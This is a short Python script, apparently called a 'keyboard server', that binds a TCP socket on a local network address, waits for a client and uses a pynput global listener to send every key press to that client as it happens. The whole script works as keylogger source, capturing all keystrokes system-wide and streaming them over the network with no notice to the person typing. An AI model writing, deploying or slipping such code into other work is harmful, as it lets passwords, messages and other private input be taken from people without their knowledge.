def keyboard_server():
    import keyboard,pynput,socket
    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.bind(("192.168.10.173", 8080))
    socket_server.listen(1)
    socket_client , addr_client = socket_server.accept()

    with pynput.keyboard.Listener(on_press= lambda key: socket_client.sendall(str(key).encode())) as listener:
        print("Keyboard server is running...")
        listener.join()

    socket_server.close()
    socket_client.close()



if __name__ == "__main__":
    keyboard_server()        
        

